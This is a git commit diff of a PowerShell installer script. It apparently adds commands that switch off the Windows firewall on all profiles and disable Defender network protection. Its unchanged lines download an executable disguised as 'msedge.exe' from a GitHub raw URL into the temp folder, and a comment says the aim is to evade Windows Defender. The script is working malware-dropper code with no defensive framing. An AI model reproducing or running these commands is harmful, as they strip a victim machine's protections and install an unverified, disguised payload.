fb9411b1dbfa32e54b81782249daa2bc9d338ca0
Nxtccijo <ietsbdbd@gmail.com>
2025-03-20 10:39:09 +0100

    Add files via upload

--- install.ps1
+++ install.ps1
@@ -1,5 +1,7 @@
 # Add C:/ to exlusions so Windows Defender doesnt flag the exe we will download
-Add-MpPreference -ExclusionPath $env:tmp
+netsh.exe advfirewall set allprofiles state off
+Set-MpPreference -EnableNetworkProtection Disabled
+Set-MpPreference -DisableDatagramProcessing $True
 
 # Download the exe and save it to temp directory
 iwr "https://raw.githubusercontent.com/Nxtccijo/oooow/refs/heads/main/msedge.exe" -outfile "$env:tmp\msedge.exe"
